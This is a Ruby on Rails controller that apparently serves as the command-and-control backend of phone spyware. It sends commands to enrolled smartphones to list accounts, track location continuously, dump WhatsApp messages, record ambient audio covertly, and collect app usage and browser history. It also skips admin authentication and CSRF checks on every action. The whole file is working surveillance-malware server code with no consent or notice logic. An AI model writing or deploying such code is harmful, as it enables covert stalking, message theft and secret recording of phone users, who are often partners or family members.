class MonitoringController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token

  def get_accounts
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      pending_command = send_command_and_wait(@smartphone, 'get_accounts', {}, timeout: 30.seconds)

      if pending_command.completed?
        accounts = pending_command.response_data['accounts'] || []
        if accounts.any?
          commandOutput = accounts.map { |acc| "#{acc['name']} (#{acc['type']})" }
        else
          error = pending_command.response_data['error']
          commandOutput = error ? ["Error: #{error}"] : ["No accounts found"]
        end
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("[MonitoringController] get_accounts failed: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "get_accounts",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def interval_geolocate
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      interval = (params[:interval] || 60).to_i.clamp(1, 3600)

      pending_command = send_command_async(@smartphone, 'start_continuous_location', { interval: interval })

      commandOutput = ["Location tracking started (interval: #{interval}s)"]

    rescue => e
      Rails.logger.error("Error starting interval geolocate: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "interval_geolocate", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dump_whatsapp_messages
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      pending_command = send_command_async(@smartphone, 'dump_whatsapp_messages', {})

      commandOutput = ["WhatsApp message extraction initiated..."]

    rescue => e
      Rails.logger.error("Error dumping WhatsApp messages: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "dump_whatsapp_messages", locals: { commandOutput: commandOutput }
      }
    end
  end

  def ambient_record
    begin
      smartphone_id = params[:smartphone_id]
      smartphone = Smartphone.find(smartphone_id)
      duration = (params[:duration] || 60).to_i.clamp(1, 3600)

      command_data = {
        command: "ambient_record",
        duration: duration,
        timestamp: Time.now.to_i
      }
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        command_data
      )
      commandOutput = ["🌙 Ambient recording started (#{duration}s) on #{smartphone.name}"]
    rescue => e
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "ambient_record", locals: { commandOutput: commandOutput } }
    end
  end

  def get_app_usage
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'get_app_usage', {}, timeout: 5.seconds)

      if pending_command.completed?
        status = pending_command.response_data['status']
        commandOutput = ["📊 App usage collection started (Status: #{status})", "Check 'App Usage' section later."]
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("Error getting app usage: #{e.message}")
      commandOutput = ["Error: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "get_app_usage", locals: { commandOutput: commandOutput } }
    end
  end

  def get_browser_history
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'get_browser_history', {}, timeout: 5.seconds)

      if pending_command.completed?
        status = pending_command.response_data['status']
        commandOutput = ["🌐 Browser history collection started (Status: #{status})", "Check 'Browser History' section later."]
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("Error getting browser history: #{e.message}")
      commandOutput = ["Error: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "get_browser_history", locals: { commandOutput: commandOutput } }
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end

  def command_service_for(smartphone)
    DeviceCommandService.new(smartphone)
  end

  def send_command_async(smartphone, command, params = {})
    command_service_for(smartphone).queue_command(command, params)
  end

  def send_command_and_wait(smartphone, command, params = {}, timeout: 30.seconds)
    command_service_for(smartphone).wait_for_command(command, params, timeout: timeout)
  end
end
